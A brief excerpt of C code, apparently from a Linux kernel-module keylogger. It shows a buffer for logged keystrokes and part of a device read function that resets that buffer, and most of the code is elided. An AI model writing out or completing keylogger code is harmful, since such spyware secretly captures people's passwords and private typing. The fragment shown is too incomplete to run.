...
// Keylogger Info
#define BUF_LEN 1024
static char keys_buffer[BUF_LEN];  // This buffer will contain all the logged keys
...
static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset)
{
	...
	memset(keys_buffer, 0, BUF_LEN); // Reset buffer after each read
